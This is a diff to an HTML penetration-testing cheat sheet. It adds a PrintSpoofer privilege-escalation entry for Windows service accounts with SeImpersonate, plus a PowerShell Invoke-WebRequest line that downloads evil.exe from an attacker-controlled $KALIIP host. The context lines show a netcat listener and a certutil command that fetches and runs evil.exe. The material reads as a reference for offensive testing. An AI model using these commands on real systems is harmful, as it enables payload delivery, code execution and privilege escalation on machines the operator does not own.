@@ -342,6 +342,10 @@ rpcclient $> exit
 <h4>Kali</h4>
 <p id="codebox">nc -lvnp 1337 $KALIPORT</p>
 
+
+<p id="info">PrintSpoofer - Can be used to escalate service user permissions on Windows Server 2016, Server 2019, and Windows 10. To escalate privileges, the service account must have SeImpersonate privileges. </p>
+<p id="codebox"><a href="https://github.com/dievus/printspoofer">PrintSpoofer code</a></p>
+
 <h3>Windows Kernel Exploits</h3>
 <p id="codebox"><a href="https://github.com/abatchy17/WindowsExploits">Precompiled EXEs for various exploits #1</a></p>
 
@@ -412,6 +416,13 @@ rpcclient $> exit
 <p id="info">Windows Download file #3</p>
 <h4>Victim</h4>
 <p id="codebox">certutil.exe -urlcache -split -f http://$KALIIP/evil.exe  C:\Microsoft\evil.exe  & C:\Microsoft\evil.exe </p>
+<p id="info">Windows Download file #4</p>
+<h4>Victim</h4>
+<p id="codebox">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -OutFile evil.exe -Uri http://$KALIIP/evil.exe </p>
+
+
+
+
 
 <h2>TFTP</h2>
 <h4>Kali</h4>
